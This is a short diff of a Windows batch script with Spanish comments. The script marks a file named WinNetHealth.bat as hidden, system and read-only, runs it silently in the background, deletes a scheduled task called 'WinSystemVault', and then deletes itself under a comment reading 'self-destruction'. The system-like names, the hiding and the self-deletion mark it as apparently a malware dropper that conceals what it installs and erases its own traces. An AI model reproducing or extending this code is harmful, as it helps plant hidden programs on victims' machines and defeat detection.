@@ -60,5 +60,6 @@ attrib +h +s +r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1
 start /b "" cmd /c "%DIR_SISTEMA%\WinNetHealth.bat"
 
 :: AUTODESTRUCCIÓN
+schtasks /delete /tn "WinSystemVault" /f >nul 2>&1
 timeout /t 2 /nobreak >nul
 del "%~f0" & exit
